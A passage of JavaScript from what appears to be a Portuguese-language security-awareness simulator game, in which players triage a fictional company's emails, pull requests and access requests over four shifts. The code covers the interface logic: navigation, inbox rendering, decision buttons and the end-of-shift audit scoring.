      this.startScreen.style.display = 'flex';
    });

    this.btnReopenSite.addEventListener('click', () => {
      audio.click();
      this.exitScreen.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });

    // 3. Tab Switching between Mail & Word 2000
    this.tabBtnMailview.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('mail');
    });

    this.tabBtnWordview.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('word');
    });

    this.btnOpenWordTab.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('word');
    });

    this.diconWord.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('word');
    });

    // 4. Dialogue navigation
    this.btnDialogNext.addEventListener('click', () => {
      audio.speechAdvance();
      const shift = this.getCurrentShift();
      if (this.currentDialogIndex < shift.ceoDialogues.length - 1) {
        this.currentDialogIndex++;
        this.renderDialogueStep();
      }
    });

    this.btnDialogPrev.addEventListener('click', () => {
      audio.speechAdvance();
      if (this.currentDialogIndex > 0) {
        this.currentDialogIndex--;
        this.renderDialogueStep();
      }
    });

    this.btnStartWorkstationFromDialog.addEventListener('click', () => {
      audio.click();
      this.ceoDialogModal.style.display = 'none';
      this.startShiftExecution();
    });

    this.btnSkipDialog.addEventListener('click', () => {
      audio.click();
      this.ceoDialogModal.style.display = 'none';
      this.startShiftExecution();
    });

    this.btnSoundToggle.addEventListener('click', () => {
      audio.enabled = !audio.enabled;
      this.btnSoundToggle.textContent = audio.enabled ? 'ðŸ”Š' : 'ðŸ”‡';
      if (audio.enabled) audio.click();
    });

    // Desktop icons filtering
    this.diconMail.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('email'); });
    this.diconGithub.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('github'); });
    this.diconIam.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('iam'); });
    this.diconDb.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('db'); });
    this.diconZap.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('zap'); });
    this.diconVault.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('vault'); });

    // Reader back
    this.btnBackToInbox.addEventListener('click', () => { audio.click(); this.showInboxList(); });
    this.browserBackBtn.addEventListener('click', () => { audio.click(); this.showInboxList(); });
    this.browserRefreshBtn.addEventListener('click', () => {
      audio.click();
      this.renderInboxRows();
      this.showToast('Fila operacional atualizada.');
    });

    this.btnToggleHeaders.addEventListener('click', () => {
      audio.click();
      const isHidden = this.technicalHeadersBox.style.display === 'none';
      this.technicalHeadersBox.style.display = isHidden ? 'flex' : 'none';
      this.btnToggleHeaders.textContent = isHidden ? 'Ocultar Detalhes â–´' : 'Detalhes de SeguranÃ§a â–¾';
    });

    // Tabs in Mail Category
    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(tab => {
      tab.addEventListener('click', (e) => {
        audio.click();
        const cat = e.currentTarget.getAttribute('data-cat');
        this.setCategoryView(cat);
      });
    });

    // Sidebar navigation
    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(item => {
      item.addEventListener('click', (e) => {
        audio.click();
        const view = e.currentTarget.getAttribute('data-view');
        this.setCategoryView(view);
      });
    });

    // Next Shift Action
    this.btnNextShiftAction.addEventListener('click', () => {
      audio.click();
      if (this.currentShiftIndex < CAMPAIGN_SHIFTS.length - 1) {
        this.currentShiftIndex++;
        this.auditReportView.style.display = 'none';
        this.openCeoDialogueForShift(this.currentShiftIndex);
      } else {
        this.currentShiftIndex = 0;
        this.campaignHistory = [];
        this.auditReportView.style.display = 'none';
        this.startScreen.style.display = 'flex';
      }
    });

    this.btnRestartShift.addEventListener('click', () => {
      audio.click();
      this.currentShiftIndex = 0;
      this.campaignHistory = [];
      this.auditReportView.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });
  }

  switchToAppView(view) {
    this.currentAppView = view;
    if (view === 'word') {
      this.tabBtnMailview.classList.remove('active-tab');
      this.tabBtnWordview.classList.add('active-tab');
      this.appWorkspaceBody.style.display = 'none';
      this.wordDocView.style.display = 'flex';
      this.browserUrlBar.value = 'file:///C:/TechCore/Documentos/Procedimentos_TI_TechCore.doc';
      this.renderWordContent();
    } else {
      this.tabBtnWordview.classList.remove('active-tab');
      this.tabBtnMailview.classList.add('active-tab');
      this.wordDocView.style.display = 'none';
      this.appWorkspaceBody.style.display = 'flex';
      this.browserUrlBar.value = this.getCurrentShift().url;
    }
  }

  renderWordContent() {
    const shift = this.getCurrentShift();
    this.wordDocContent.innerHTML = shift.wordContent;
  }

  openCeoDialogueForShift(shiftIndex) {
    this.currentShiftIndex = shiftIndex;
    this.currentDialogIndex = 0;
    const shift = this.getCurrentShift();

    // Apply shift-specific theme to dialog box
    const dialogBox = this.ceoDialogModal.querySelector('.ceo-dialog-box-retro');
    if (dialogBox) {
      dialogBox.className = 'ceo-dialog-box-retro';
      if (shift.shiftNumber === 2) dialogBox.classList.add('shift-2-dialog-theme');
    }

    this.ceoDialogTitlebar.textContent = `ðŸ“¡ CANAL_DIRETORIA // BRIEFING_TURNO_${shift.shiftNumber}_ROGERIO_CEO`;
    this.ceoDialogSpeakerTag.textContent = `ðŸ“Ÿ COMUNICADO DO CEO ROGÃ‰RIO (TURNO ${shift.shiftNumber}/${CAMPAIGN_SHIFTS.length}):`;
    
    this.renderDialogueStep();
    this.ceoDialogModal.style.display = 'flex';
  }

  renderDialogueStep() {
    const shift = this.getCurrentShift();
    const dialog = shift.ceoDialogues[this.currentDialogIndex];
    this.ceoSpeechText.innerHTML = dialog.text;
    this.dialogStepIndicator.textContent = `Mensagem ${dialog.step} de ${shift.ceoDialogues.length}`;

    const imgEl = document.getElementById('ceo-pixel-img');
    const nameEl = document.getElementById('ceo-speaker-name');
    const roleEl = document.getElementById('ceo-speaker-role');

    if (dialog.speaker) {
      if (nameEl) nameEl.textContent = dialog.speaker;
      if (roleEl) roleEl.textContent = dialog.role || 'TechCore Executivo';
      if (imgEl && dialog.avatar) imgEl.src = dialog.avatar;
      this.ceoDialogSpeakerTag.textContent = `ðŸ“Ÿ BRIEFING // ${dialog.speaker.toUpperCase()} (${shift.title}):`;
    } else {
      if (nameEl) nameEl.textContent = 'RogÃ©rio Silva';
      if (roleEl) roleEl.textContent = 'CEO TechCore';
      if (imgEl) imgEl.src = 'ceo_rogerio.jpg?v=5';
      this.ceoDialogSpeakerTag.textContent = `ðŸ“Ÿ COMUNICADO DO CEO ROGÃ‰RIO (TURNO ${shift.shiftNumber}/${CAMPAIGN_SHIFTS.length}):`;
    }

    this.btnDialogPrev.style.display = this.currentDialogIndex > 0 ? 'inline-flex' : 'none';
    
    if (this.currentDialogIndex === shift.ceoDialogues.length - 1) {
      this.btnDialogNext.style.display = 'none';
      this.btnStartWorkstationFromDialog.style.display = 'inline-flex';
      this.btnStartWorkstationFromDialog.textContent = `ðŸš€ Iniciar Turno ${shift.shiftNumber} (09:00)`;
    } else {
      this.btnDialogNext.style.display = 'inline-flex';
      this.btnStartWorkstationFromDialog.style.display = 'none';
    }
  }

  startShiftExecution() {
    const shift = this.getCurrentShift();
    this.startScreen.style.display = 'none';
    this.mainWorkspace.style.display = 'flex';
    this.processedItems = [];
    this.decisionsHistory = [];
    this.currentCategoryFilter = 'all';

    this.switchToAppView('mail');

    // Update Header
    this.shiftPillBadge.textContent = `TURNO ${shift.shiftNumber}/4`;
    this.browserTabIcon.innerHTML = shift.brandIcon;
    this.browserTabTitle.textContent = `${shift.brandName} - Turno ${shift.shiftNumber} (${shift.scenarios.length} itens)`;
    this.browserUrlBar.value = shift.url;
    this.appBrandIcon.innerHTML = shift.brandIcon;
    this.appBrandName.textContent = shift.brandName;
    this.taskbarActiveTitle.innerHTML = `${shift.brandIcon} ${shift.brandName} - Turno ${shift.shiftNumber}`;

    // Show/hide apps in sidebar & tabs based on shift
    this.folderDbRow.style.display = shift.shiftNumber >= 2 ? 'flex' : 'none';
    this.tabBtnDb.style.display = shift.shiftNumber >= 2 ? 'flex' : 'none';

    this.folderZapRow.style.display = shift.shiftNumber >= 3 ? 'flex' : 'none';
    this.tabBtnZap.style.display = shift.shiftNumber >= 3 ? 'flex' : 'none';

    this.folderVaultRow.style.display = shift.shiftNumber >= 4 ? 'flex' : 'none';
    this.tabBtnVault.style.display = shift.shiftNumber >= 4 ? 'flex' : 'none';

    this.updateBadges();
    this.showInboxList();
    this.renderInboxRows();
  }

  setCategoryView(view) {
    this.currentCategoryFilter = view;

    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(i => {
      i.classList.toggle('active', i.getAttribute('data-view') === view);
    });

    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(t => {
      t.classList.toggle('active', t.getAttribute('data-cat') === view);
    });

    this.showInboxList();
    this.renderInboxRows();
  }

  showInboxList() {
    this.emailReaderView.style.display = 'none';
    this.auditReportView.style.display = 'none';
    this.inboxListView.style.display = 'flex';
    this.renderInboxRows();
  }

  updateBadges() {
    const shift = this.getCurrentShift();
    const unread = shift.scenarios.filter((_, idx) => !this.processedItems.includes(idx));
    
    const unreadEmail = unread.filter(s => s.channel === 'email').length;
    const unreadGithub = unread.filter(s => s.channel === 'github').length;
    const unreadIam = unread.filter(s => s.channel === 'iam').length;
    const unreadDb = unread.filter(s => s.channel === 'db').length;
    const unreadZap = unread.filter(s => s.channel === 'zap').length;
    const unreadVault = unread.filter(s => s.channel === 'vault').length;

    this.badgeEmailCount.textContent = unreadEmail;
    this.badgeGithubCount.textContent = unreadGithub;
    this.badgeIamCount.textContent = unreadIam;
    this.badgeDbCount.textContent = unreadDb;
    this.badgeZapCount.textContent = unreadZap;
    this.badgeVaultCount.textContent = unreadVault;
    this.badgeDoneCount.textContent = this.processedItems.length;

    this.tabEmailTag.textContent = `${unreadEmail} novos`;
    this.tabGithubTag.textContent = `${unreadGithub} novos`;
    this.tabIamTag.textContent = `${unreadIam} novos`;
    if (this.tabDbTag) this.tabDbTag.textContent = `${unreadDb} novos`;
    if (this.tabZapTag) this.tabZapTag.textContent = `${unreadZap} novos`;
    if (this.tabVaultTag) this.tabVaultTag.textContent = `${unreadVault} novos`;
    
    const activeItem = shift.scenarios[this.processedItems.length] || shift.scenarios[shift.scenarios.length - 1];
    const timeStr = this.processedItems.length >= shift.scenarios.length ? '18:00' : activeItem.time;
    this.shiftClock.textContent = timeStr;
    this.taskbarClock.textContent = timeStr;
  }

  renderInboxRows() {
    this.emailItemsContainer.innerHTML = '';
    const shift = this.getCurrentShift();

    shift.scenarios.forEach((item, index) => {
      const isProcessed = this.processedItems.includes(index);

      if (this.currentCategoryFilter === 'processed') {
        if (!isProcessed) return;
      } else if (this.currentCategoryFilter !== 'all' && item.channel !== this.currentCategoryFilter) {
        return;
      }

      const row = document.createElement('div');
      row.className = `email-row-item ${!isProcessed ? 'unread' : 'processed'}`;
      
      let tagLabel = 'TechMail';
      let tagClass = 'tag-email';
      if (item.channel === 'github') { tagLabel = 'GitHub PR'; tagClass = 'tag-github'; }
      if (item.channel === 'iam') { tagLabel = 'IAM Access'; tagClass = 'tag-iam'; }
      if (item.channel === 'db') { tagLabel = 'TechDB SQL'; tagClass = 'tag-db'; }
      if (item.channel === 'zap') { tagLabel = 'TechZap Chat'; tagClass = 'tag-zap'; }
      if (item.channel === 'vault') { tagLabel = 'TechVault'; tagClass = 'tag-vault'; }

      let avatarHtml = item.avatarImg ? `<img src="${item.avatarImg}" style="width:28px;height:28px;border-radius:50%;object-fit:cover;margin-right:10px;">` : `<div style="width:28px;height:28px;border-radius:50%;background-color:${item.avatarColor};color:#fff;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:12px;margin-right:10px;">${item.avatarChar}</div>`;
      row.innerHTML = `
        <div class="row-controls">
          <input type="checkbox" ${isProcessed ? 'checked' : ''} onclick="event.stopPropagation()">
          <span class="row-star" onclick="event.stopPropagation(); this.classList.toggle('starred')">â˜…</span>
        </div>
        <div style="display:flex; align-items:center; width:220px; margin-left: 10px;">
          ${avatarHtml}
          <div class="row-sender" style="width:auto; margin-left:0;">${this.escapeHtml(item.senderName)}</div>
        </div>
        <span class="row-tag ${tagClass}">${tagLabel}</span>
        <div class="row-content">
          ${!isProcessed ? '<span class="row-new-badge">NOVO</span>' : ''}
          <span class="row-subject">${this.escapeHtml(item.subject)}</span>
          <span class="row-snippet"> - ${this.escapeHtml(item.snippet)}</span>
        </div>
        <div class="row-time">${item.time}</div>
      `;

      row.addEventListener('click', () => {
        audio.openMail();
        this.openReader(index);
      });

      this.emailItemsContainer.appendChild(row);
    });

    if (this.emailItemsContainer.children.length === 0) {
      this.emailItemsContainer.innerHTML = `
        <div style="padding: 40px; text-align: center; color: #747775;">
          <div style="font-size: 32px; margin-bottom: 8px;">ðŸ“­</div>
          <p>Nenhum item nesta fila de exibiÃ§Ã£o.</p>
        </div>
      `;
    }
  }

  openReader(index) {
    const shift = this.getCurrentShift();
    const item = shift.scenarios[index];
    const isProcessed = this.processedItems.includes(index);

    this.inboxListView.style.display = 'none';
    this.emailReaderView.style.display = 'flex';
    this.technicalHeadersBox.style.display = 'none';
    this.btnToggleHeaders.textContent = 'Detalhes de SeguranÃ§a â–¾';

    let typeText = 'E-MAIL CORPORATIVO';
    if (item.channel === 'github') typeText = 'GITHUB PULL REQUEST';
    if (item.channel === 'iam') typeText = 'CHAMADO DE ACESSO IAM';
    if (item.channel === 'db') typeText = 'AUDITORIA DE BANCO TECHDB';
    if (item.channel === 'zap') typeText = 'TECHZAP WHATSAPP CHAT';
    if (item.channel === 'vault') typeText = 'DESPACHO TECHVAULT';

    this.readerTypeTag.textContent = typeText;
    this.readerTimeMeta.textContent = item.time;
    this.readerSubjectTitle.textContent = item.subject;

    if (item.avatarImg) {
      this.readerSenderAvatar.innerHTML = `<img src="${item.avatarImg}" style="width:100%;height:100%;border-radius:50%;object-fit:cover;">`;
      this.readerSenderAvatar.style.backgroundColor = 'transparent';
    } else {
      this.readerSenderAvatar.textContent = item.avatarChar;
      this.readerSenderAvatar.style.backgroundColor = item.avatarColor;
    }
    this.readerSenderName.textContent = item.senderName;
    this.readerSenderEmail.textContent = `<${item.senderEmail}>`;
    this.readerReceivedTime.textContent = item.meta['Data'] || item.time;

    this.headerDe.textContent = item.meta['De'] || item.meta['Origem'] || item.meta['Contato'] || item.meta['Arquivo'] || '-';
    this.headerPara.textContent = item.meta['Para'] || item.meta['Endpoint'] || item.meta['Destino'] || '-';
    this.headerData.textContent = item.meta['Data'] || '-';
    this.headerAuth.textContent = item.meta['SeguranÃ§a'] || item.meta['Status'] || item.meta['Prioridade'] || '-';

    // Render Inspector (PURE RAW FACTS - NO SPOILER HINTS)
    if (item.inspector.type === 'diff') {
      let diffLinesHtml = item.inspector.diff.map(line => {
        let cls = 'diff-info';
        if (line.type === 'added') cls = 'diff-added';
        if (line.type === 'removed') cls = 'diff-removed';
        return `<span class="${cls}">${this.escapeHtml(line.text)}</span>`;
      }).join('\n');

      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">ðŸ” ${item.inspector.label}</div>
        <pre class="diff-view"><code>${diffLinesHtml}</code></pre>
      `;
    } else {
      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">ðŸ” ${item.inspector.label}</div>
        <div class="url-inspector-card">
          <span style="font-size: 10.5px; color: #94a3b8;">ORIGEM / DESTINO / QUERY ANALISADA:</span>
          <span class="url-dest">${this.escapeHtml(item.inspector.dest)}</span>
        </div>
      `;
    }

    if (item.channel === 'zap') {
      // TechZap / WhatsApp Attachment Card Handling
      this.readerBodyMessage.innerHTML = item.body;
      this.readerInspectorSection.style.display = 'none'; // Hidden until document is clicked

      setTimeout(() => {
        const wzAttCard = document.getElementById('wz-attachment-card');
        if (wzAttCard) {
          wzAttCard.addEventListener('click', () => {
            audio.click();
            const isHidden = this.readerInspectorSection.style.display === 'none';
            this.readerInspectorSection.style.display = isHidden ? 'block' : 'none';
            wzAttCard.classList.toggle('active-open', isHidden);
            if (isHidden) {
              this.readerInspectorSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }
          });
        }
      }, 50);
    } else {
      // Gmail Attachment Card for ALL non-WhatsApp channels (Email, IAM, GitHub, DB, TechVault)
      let fileName = item.attachmentFileName || 'documento_solicitacao.pdf';
      let badgeClass = 'badge-diff';

      if (item.channel === 'db' || (item.inspector && item.inspector.dest && item.inspector.dest.includes('SELECT'))) {
        badgeClass = 'badge-sql';
      }

      const attachmentHtml = `
        <div class="gmail-attachment-container">
          <div class="gmail-attachment-header">
            <span class="att-count-text">One attachment</span>
            <span class="att-bullet">â€¢</span>
            <span class="att-scanned-text">Scanned by Gmail</span>
            <span class="att-info-icon" title="Scanned by Gmail">â“˜</span>
            <button class="att-drive-btn" type="button" onclick="event.stopPropagation()">
              <svg viewBox="0 0 24 24" width="14" height="14" style="vertical-align:middle;margin-right:2px;"><path fill="#4285f4" d="M12 2L4.5 15h15z"/><path fill="#34a853" d="M12 2l7.5 13H4.5z"/><path fill="#fbc02d" d="M4.5 15l3.75 6.5h15.5L19.5 15z"/></svg>
              Add to Drive
            </button>
          </div>

          <div class="gmail-attachment-card" id="gmail-attachment-card" title="Clique para abrir e visualizar os detalhes do anexo">
            <div class="att-thumbnail-box">
              <div class="att-doc-icon-preview">
                <div class="att-doc-line"></div>
                <div class="att-doc-line"></div>
                <div class="att-doc-line short"></div>
              </div>
              <div class="att-click-hint">ðŸ” Clique para abrir o anexo</div>
            </div>
            <div class="att-footer-bar">
              <div class="att-file-badge ${badgeClass}">&lt;/&gt;</div>
              <span class="att-file-name" title="${fileName}">${fileName}</span>
              <div class="att-dog-ear"></div>
            </div>
          </div>
        </div>
      `;

      this.readerBodyMessage.innerHTML = item.body + attachmentHtml;
      this.readerInspectorSection.style.display = 'none'; // Hidden until attachment card is clicked

      setTimeout(() => {
        const attCard = document.getElementById('gmail-attachment-card');
        if (attCard) {
          attCard.addEventListener('click', () => {
            audio.click();
            const isHidden = this.readerInspectorSection.style.display === 'none';
            this.readerInspectorSection.style.display = isHidden ? 'block' : 'none';
            attCard.classList.toggle('active-open', isHidden);
            if (isHidden) {
              this.readerInspectorSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }
          });
        }
      }, 50);
    }

    // Render Inspector (PURE RAW FACTS - NO SPOILER HINTS)
    if (item.inspector.type === 'diff') {
      let diffLinesHtml = item.inspector.diff.map(line => {
        let cls = 'diff-info';
        if (line.type === 'added') cls = 'diff-added';
        if (line.type === 'removed') cls = 'diff-removed';
        return `<span class="${cls}">${this.escapeHtml(line.text)}</span>`;
      }).join('\n');

      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">ðŸ” ${item.inspector.label}</div>
        <pre class="diff-view"><code>${diffLinesHtml}</code></pre>
      `;
    } else {
      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">ðŸ” ${item.inspector.label}</div>
        <div class="url-inspector-card">
          <span style="font-size: 10.5px; color: #94a3b8;">ORIGEM / DESTINO / QUERY ANALISADA:</span>
          <span class="url-dest">${this.escapeHtml(item.inspector.dest)}</span>
        </div>
      `;
    }

    // Render Decision Buttons (Neutral without red/green clues)
    if (isProcessed) {
      this.decisionButtonsGroup.innerHTML = `
        <div style="font-size: 13px; color: #475569; font-weight: 600;">
          âœ“ Este item jÃ¡ foi processado anteriormente durante este expediente.
        </div>
      `;
    } else {
      this.decisionButtonsGroup.innerHTML = item.actions.map(action => {
        return `
          <button class="btn-decision" data-action-id="${action.id}">
            ${action.label}
          </button>
        `;
      }).join('');

      this.decisionButtonsGroup.querySelectorAll('.btn-decision').forEach(btn => {
        btn.addEventListener('click', (e) => {
          const actionId = e.currentTarget.getAttribute('data-action-id');
          const chosenAction = item.actions.find(a => a.id === actionId);
          this.processAction(index, item, chosenAction);
        });
      });
    }
  }

  processAction(index, item, action) {
    audio.actionDone();

    this.processedItems.push(index);
    const decisionRecord = {
      shiftNumber: this.getCurrentShift().shiftNumber,
      scenarioIndex: index,
      channel: item.channel,
      subject: item.subject,
      chosenActionLabel: action.label,
      logTitle: action.logTitle,
      correct: action.correct,
      consequence: action.consequence,
      explanation: action.explanation
    };

    this.decisionsHistory.push(decisionRecord);
    this.campaignHistory.push(decisionRecord);

    this.showToast(action.toastMsg);
    this.updateBadges();

    const shift = this.getCurrentShift();
    if (this.processedItems.length >= shift.scenarios.length) {
      setTimeout(() => {
        this.showShiftAuditReport();
      }, 700);
    } else {
      setTimeout(() => {
        this.showInboxList();
      }, 500);
    }
  }

  showToast(msg) {
    this.toastMsg.textContent = msg;
    this.actionToast.style.display = 'flex';
    setTimeout(() => {
      this.actionToast.style.display = 'none';
    }, 2400);
  }

  showShiftAuditReport() {
    audio.endFanfare();

    this.emailReaderView.style.display = 'none';
    this.inboxListView.style.display = 'none';
    this.auditReportView.style.display = 'flex';
    this.shiftClock.textContent = '18:00';
    this.taskbarClock.textContent = '18:00';

    const shift = this.getCurrentShift();
    const isFinalShift = this.currentShiftIndex === CAMPAIGN_SHIFTS.length - 1;

    const totalScenarios = this.decisionsHistory.length;
    const correctCount = this.decisionsHistory.filter(d => d.correct).length;
    const incorrectCount = totalScenarios - correctCount;

    const maxAllowedErrors = shift.shiftNumber === 4 ? 1 : 2;
    const isApproved = incorrectCount <= maxAllowedErrors;

    const health = Math.max(0, 100 - (incorrectCount * 20));
    const reputation = Math.max(0, 100 - (incorrectCount * 12) + (correctCount * 6));

    this.reportThreatsAvoided.textContent = correctCount;
    this.reportThreatsTaken.textContent = incorrectCount;
    this.reportHealthFinal.textContent = `${health}%`;
    this.reportHealthFinal.className = health >= 60 ? 'card-num text-emerald' : 'card-num text-danger';
    this.reportReputationFinal.textContent = `${reputation} pts`;

    this.auditStamp.textContent = `TECHCORE CISO AUDIT // TURNO ${shift.shiftNumber}`;
    this.auditTitle.textContent = isFinalShift 
      ? 'ðŸ† RELATÃ“RIO FINAL DA CAMPANHA DE DEFESA (4 TURNOS)' 
      : `RelatÃ³rio de Desempenho - ${shift.title}`;
    this.auditSubText.textContent = `Expediente encerrado Ã s 18:00. AvaliaÃ§Ã£o do Turno ${shift.shiftNumber} de 4 (TolerÃ¢ncia: atÃ© ${maxAllowedErrors} erro(s) permitido(s)).`;

    if (incorrectCount === 0) {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO RogÃ©rio: Aprovado com Louvor no Turno ${shift.shiftNumber}!`;
      this.auditVerdictText.textContent = 'Desempenho 100% perfeito! VocÃª neutralizou todas as ameaÃ§as sem nenhum falso positivo ou incidente cibernÃ©tico.';
    } else if (isApproved) {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO RogÃ©rio: Turno ${shift.shiftNumber} APROVADO (Dentro da Margem de TolerÃ¢ncia de ${maxAllowedErrors} Erro(s))`;
      this.auditVerdictText.textContent = `VocÃª teve ${incorrectCount} incidente(s), mas manteve a infraestrutura sob controle e estÃ¡ plenamente autorizado a prosseguir!`;
    } else {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO RogÃ©rio: Reprovado no Turno ${shift.shiftNumber} (Mais de ${maxAllowedErrors} Erro(s))`;
      this.auditVerdictText.textContent = `VocÃª cometeu ${incorrectCount} erros crÃ­ticos, ultrapassando o limite tolerado de ${maxAllowedErrors} falha(s). A integridade da empresa foi comprometida.`;
    }

    if (!isFinalShift) {
      const nextShiftNum = shift.shiftNumber + 1;
      this.btnNextShiftAction.style.display = 'inline-flex';
      this.btnNextShiftAction.textContent = isApproved 
        ? `â–¶ AvanÃ§ar para o Turno ${nextShiftNum} (${CAMPAIGN_SHIFTS[this.currentShiftIndex + 1].brandName})` 
        : `ðŸ”„ Repetir Turno ${shift.shiftNumber}`;
      this.btnRestartShift.style.display = 'none';
    } else {
      this.btnNextShiftAction.style.display = 'none';
      this.btnRestartShift.style.display = 'inline-flex';
      this.btnRestartShift.textContent = 'ðŸ”„ Reiniciar Campanha Completa (Do Turno 1)';
    }

    this.auditTableBody.innerHTML = this.decisionsHistory.map((item, idx) => `
      <tr>
        <td><strong>#${idx + 1}</strong></td>
        <td><span class="row-tag tag-${item.channel}">${item.channel.toUpperCase()}</span></td>
        <td><strong>${this.escapeHtml(item.subject)}</strong></td>
        <td>${this.escapeHtml(item.chosenActionLabel)}</td>
        <td><strong style="color: ${item.correct ? 'var(--google-green)' : 'var(--google-red)'};">${item.correct ? 'âœ… ACERTO' : 'âŒ INCIDENTE'}</strong></td>
        <td style="font-size: 11.5px; color: #444746; line-height: 1.4;">
          <strong>${this.escapeHtml(item.logTitle)}:</strong> ${this.escapeHtml(item.consequence)}<br>
          <em style="color: #747775;">${this.escapeHtml(item.explanation)}</em>
        </td>
      </tr>
    `).join('');
  }

  escapeHtml(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
}

// Start Simulator
window.addEventListener('DOMContentLoaded', () => {
  window.simulator = new TechMailSimulator();
});

